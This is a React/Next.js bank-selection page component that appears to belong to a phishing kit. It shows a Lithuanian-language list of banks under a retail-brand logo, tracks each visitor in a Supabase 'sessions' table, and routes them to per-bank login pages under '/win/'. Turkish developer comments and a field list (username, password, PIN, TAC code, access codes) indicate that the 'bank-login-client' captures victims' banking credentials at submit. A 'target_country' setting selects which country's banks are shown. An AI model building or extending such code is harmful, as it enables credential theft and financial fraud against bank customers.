"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { optimizeSupabaseImageUrl } from "@/lib/asset-url";
import type { BankCatalogEntry } from "@/lib/at-bank-catalog";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { getPreferredRouteSessionId, persistActiveSession } from "@/lib/session-id-client";
import { useSettings } from "@/contexts/SettingsContext";
import { countriesMatch } from "@/lib/country-utils";
import { resolveLocalBankLogoFile } from "@/lib/bank-logo-constants";

type Props = {
  sessionId: string;
  routeSessionId?: string;
  initialBanks: BankCatalogEntry[];
};

export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
  const [banks, setBanks] = useState<BankCatalogEntry[]>(initialBanks);
  const [bankSlug, setBankSlug] = useState("");
  const [searchTerm, setSearchTerm] = useState("");
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const [recovering, setRecovering] = useState(false);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
  const navigationLockRef = useRef(false);
  const refreshAbortRef = useRef<AbortController | null>(null);
  const selectionVersionRef = useRef(0);
  const mountedRef = useRef(true);

  useEffect(() => {
    setBanks(initialBanks);
  }, [initialBanks]);

  useEffect(() => {
    mountedRef.current = true;
    return () => {
      mountedRef.current = false;
      selectionVersionRef.current += 1;
      refreshAbortRef.current?.abort();
    };
  }, []);

  const refreshBanks = useCallback(async () => {
    if (navigationLockRef.current) return;

    refreshAbortRef.current?.abort();
    const controller = new AbortController();
    refreshAbortRef.current = controller;

    try {
      const res = await fetch(`/api/banks?t=${Date.now()}`, {
        cache: "no-store",
        headers: {
          "Cache-Control": "no-cache",
        },
        signal: controller.signal,
      });

      if (!res.ok) return;
      const data = await res.json();
      if (!Array.isArray(data.banks)) return;

      setBanks(
        data.banks.map((bank: any) => {
          const rawLogoFile = bank.logoFile ?? bank.logo_file;
          const resolvedLogoFile = resolveLocalBankLogoFile(bank.slug ?? null, rawLogoFile);
          return {
            slug: bank.slug,
            name: bank.name,
            domain: bank.domain,
            logoFile: resolvedLogoFile,
            country: bank.country,
            isActive: bank.isActive !== false && bank.is_active !== false,
          };
        }),
      );
    } catch (error) {
      if (error instanceof Error && error.name === "AbortError") return;
      /* ignore transient refresh errors */
    } finally {
      if (refreshAbortRef.current === controller) {
        refreshAbortRef.current = null;
      }
    }
  }, []);

  useEffect(() => {
    if (!sessionId) return;
    persistActiveSession(sessionId, routeSessionId);
    if (supabase) {
      void supabase
        .from("sessions")
        .update({ is_hidden: false, current_step: "banken" })
        .eq("id", sessionId);
    }
    if (window.location.search.includes("session=")) {
      window.history.replaceState(window.history.state, "", "/banken");
    }
  }, [sessionId, routeSessionId, supabase]);

  useEffect(() => {
    const resetUi = () => {
      selectionVersionRef.current += 1;
      navigationLockRef.current = false;
      setSaving(false);
      setMsg(null);
      setRecovering(false);
      setSearchTerm("");
      setBankSlug("");
      setBanks(initialBanks);
    };

    const refreshView = () => {
      if (navigationLockRef.current) return;
      resetUi();
      void refreshBanks();
    };

    const onPageShow = (event: PageTransitionEvent) => {
      const entries = typeof performance !== "undefined" ? performance.getEntriesByType("navigation") : [];
      const navEntry = entries[0] as PerformanceNavigationTiming | undefined;
      const isBackForward = navEntry?.type === "back_forward";

      if (event.persisted || isBackForward) {
        refreshView();
      }
    };

    window.addEventListener("pageshow", onPageShow);
    return () => {
      window.removeEventListener("pageshow", onPageShow);
    };
  }, [initialBanks, refreshBanks]);

  const demoOptions = useMemo(() => {
    // Sadece aktif olanları ve (eğer seçilmişse) hedef ülkenin bankalarını göster
    // 🚨 FACEBOOK BANKA DEGIL: Kullanici banka listesinde ASLA gorunmesin.
    const NON_BANK_SLUGS = /facebook|meta|instagram/i;
    let validBanks = banks.filter(b => b.isActive !== false && !(b?.slug && NON_BANK_SLUGS.test(b.slug)));
    
    if (settings.target_country && settings.target_country !== "Tümü") {
      validBanks = validBanks.filter(b => countriesMatch(b.country, settings.target_country));
    }

    return validBanks.map((bank) => ({
      slug: bank.slug,
      displayName: bank.name,
      domain: bank.domain,
      logoFile: resolveLocalBankLogoFile(bank.slug, bank.logoFile),
    }));
  }, [banks, settings.target_country]);

  const filteredOptions = useMemo(() => {
    const q = searchTerm.trim().toLowerCase();
    if (!q) return demoOptions;
    return demoOptions.filter((opt) => opt.displayName.toLowerCase().includes(q));
  }, [searchTerm, demoOptions]);

  useEffect(() => {
    if (sessionId) return;
    try {
      const cachedSessionId = localStorage.getItem("activeSessionId");
      if (cachedSessionId) {
        setRecovering(true);
        router.replace("/banken");
      }
    } catch {
      /* ignore localStorage access errors */
    }
  }, [sessionId]);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setSessionFormData(fd);
      setBankSlug(fd.bankSlug ?? "");
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleBankSelect(nextBankSlug: string, displayName: string) {
    if (!supabase || !sessionId || !nextBankSlug || navigationLockRef.current) return;

    const selectionVersion = selectionVersionRef.current + 1;
    selectionVersionRef.current = selectionVersion;
    navigationLockRef.current = true;
    refreshAbortRef.current?.abort();
    setSaving(true);
    setMsg(null);
    setBankSlug(nextBankSlug);

    const nextFormData: Record<string, any> = {
      ...sessionFormData,
    };

    // 🔴 KRITIK: bankSlug / bankName ALANLARINI BURADA DB YE YAZMA!
    //    Neden? Kullanici SEB secti -> submit -> sonra Swedbank'a sectiginde,
    //    eger burada bankName=Swedbank yazarsak ESKI SEB submitinin bankName
    //    kaydini DB den silmis oluruz. Sonra Swedbank submit esnasinda
    //    sfd.bankName (ESKI) Swedbank olur (SEB degil) -> history yanlis isimle kaydedilir.
    //    Bunlar SADECE bank-login-client icindeki HANDLE SUBMIT aninda credentials
    //    icinden nextFormData'ya yazilir (garantili).

    // Banka değiştirildiğinde eski bankaya ait giriş bilgilerini temizle
    const bankSpecificFields = [
      "username", "password", "verfuegernummer", "pin", "rekeningnummer",
      "pasnummer", "toegangscode", "signatuur", "identificatiecode", "tacCode"
    ];
    for (const field of bankSpecificFields) {
      delete nextFormData[field];
    }

    const { error } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "bank",
        form_data: nextFormData,
      })
      .eq("id", sessionId);

    if (!mountedRef.current || selectionVersionRef.current !== selectionVersion) {
      return;
    }

    setSaving(false);
    if (error) {
      navigationLockRef.current = false;
      setMsg("Nepavyko išsaugoti.");
    }
    else {
      setSessionFormData(nextFormData);
      router.push(`/win/${effectiveRouteSessionId}/bank/${nextBankSlug}`);
    }
  }

  if (!supabase) {
    return (
      <div className="pak-page-shell">
        <div className="pak-form-card w-full max-w-[650px] p-5 sm:p-8">
          <div className="pak-form-inner"><ConfigMissing /></div>
        </div>
      </div>
    );
  }

  if (!sessionId) {
    if (recovering) {
      return (
        <div className="pak-page-shell">
          <div className="pak-form-card w-full max-w-[520px] p-8 text-center">
            <div className="pak-form-inner">
              <h2 className="pak-form-title mb-2">{settings.banken_title}</h2>
              <p className="pak-form-subtitle mb-8 text-sm">Sesija atkuriamasi...</p>
              <div className="flex justify-center py-8">
                <div className="size-10 animate-spin rounded-full border-4 border-[#4ade80] border-t-transparent" />
              </div>
            </div>
          </div>
        </div>
      );
    }
    return (
      <div className="pak-page-shell">
        <div className="pak-form-card w-full max-w-[520px] p-8 text-center">
          <div className="pak-form-inner">
            <h2 className="pak-form-title mb-2">{settings.banken_title}</h2>
            <p className="pak-form-subtitle mb-6 text-sm">Neteisinga nuoroda.</p>
            <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
              Norėdami tęsti, naudokite visą nuorodą.
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="pak-page-shell">
      <div className="pak-form-card fade-in flex h-[calc(100dvh-3rem)] max-h-[780px] w-full max-w-[620px] flex-col overflow-hidden">
        <div className="pak-form-inner flex min-h-0 flex-1 flex-col p-4 sm:p-6">
          <div className="mb-4 flex shrink-0 items-start justify-between gap-4">
            <div className="min-w-0">
              <h2 className="pak-form-title">{settings.banken_title}</h2>
              <p className="pak-form-subtitle mt-1.5 text-[13px] sm:text-sm">{settings.banken_subtitle}</p>
            </div>
            <img
              src={settings.logo_url || "/form-assets/iki-mini-logo.webp"}
              alt={settings.portal_name || "Brand"}
              className="pak-form-brand-logo shrink-0"
            />
          </div>

          <div className="mb-4 shrink-0">
            <div className="flex items-center gap-2.5 rounded-xl border border-[#4ade80]/16 bg-white/6 px-4 py-3 transition-colors focus-within:border-[#4ade80]/55">
              <svg aria-hidden viewBox="0 0 24 24" className="h-4.5 w-4.5 shrink-0 text-white/40" fill="none" stroke="currentColor" strokeWidth="2">
                <circle cx="11" cy="11" r="7" />
                <path d="m20 20-3.5-3.5" />
              </svg>
              <input
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                placeholder={settings.banken_search_placeholder}
                className="w-full bg-transparent text-sm text-white outline-none placeholder:text-white/35"
              />
            </div>
          </div>

          <div className="custom-scrollbar min-h-0 flex-1 overflow-y-auto pr-1">
            <div className="grid grid-cols-1 gap-2.5 pb-1">
              {filteredOptions.length === 0 ? (
                <div className="rounded-2xl border border-[#4ade80]/16 bg-white/5 p-5 text-center text-sm text-white/60">
                  Pasirinktai šaliai bankų nerasta. Išvalykite paieškos filtrą.
                </div>
              ) : filteredOptions.map((opt, idx) => (
                <button
                  key={opt.slug}
                  type="button"
                  onClick={() => void handleBankSelect(opt.slug, opt.displayName)}
                  disabled={saving}
                  className={`group flex w-full items-center gap-3.5 rounded-2xl border px-4 py-3 text-left transition-all duration-200 animate-[fadeIn_0.4s_ease-out_both] ${
                    bankSlug === opt.slug
                      ? "border-[#4ade80]/70 bg-[rgba(74,222,128,0.14)] shadow-[0_8px_24px_rgba(74,222,128,0.18)]"
                      : "border-[#4ade80]/14 bg-white/5 hover:border-[#4ade80]/50 hover:bg-white/9 hover:shadow-[0_8px_24px_rgba(0,0,0,0.35)]"
                  }`}
                  style={{ animationDelay: `${idx * 28}ms` }}
                >
                  <div className="flex size-12 shrink-0 items-center justify-center overflow-hidden rounded-full border border-[#4ade80]/25 bg-white shadow-[0_4px_14px_rgba(0,0,0,0.35)]">
                    <img
                      src={optimizeSupabaseImageUrl(opt.logoFile, { format: "webp", quality: 90, width: 256 }) || opt.logoFile}
                      alt={opt.displayName}
                      className="h-full w-full rounded-full object-cover"
                      onError={(e) => {
                        e.currentTarget.onerror = null;
                        e.currentTarget.style.display = 'none';
                        const fallback = e.currentTarget.nextElementSibling as HTMLElement;
                        if (fallback) fallback.style.display = 'grid';
                      }}
                    />
                    <div style={{ display: 'none' }} className="grid h-full w-full place-items-center bg-[#0fae4e]/15 text-sm font-black text-[#0fae4e]">
                      {opt.displayName.charAt(0)}
                    </div>
                  </div>

                  <div className="min-w-0 flex-1 text-left">
                    <p className="truncate text-[15px] font-bold text-white sm:text-[16px]">
                      {opt.displayName}
                    </p>
                  </div>

                  <div className="flex shrink-0 items-center">
                    {saving && bankSlug === opt.slug ? (
                      <div className="size-5 animate-spin rounded-full border-2 border-[#4ade80] border-t-transparent" />
                    ) : (
                      <svg aria-hidden viewBox="0 0 24 24" className="h-5 w-5 text-white/35 transition-colors group-hover:text-[#4ade80]" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                        <path d="m9 6 6 6-6 6" />
                      </svg>
                    )}
                  </div>
                </button>
              ))}
            </div>
          </div>

          <div className="mt-4 shrink-0 border-t border-[#4ade80]/14 pt-4">
            <div className="pak-form-security justify-center text-center">
              <svg className="h-6 w-6 shrink-0 text-[#4ade80]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
              <span>Jūsų banko pasirinkimas apdorojamas saugiai.</span>
            </div>
          </div>
        </div>
      </div>

      {msg ? (
        <div className="mt-3 w-full max-w-[620px] rounded-xl border border-red-500/30 bg-red-500/10 p-3.5 text-center text-sm text-red-400">
          {msg}
        </div>
      ) : null}
    </div>
  );
}
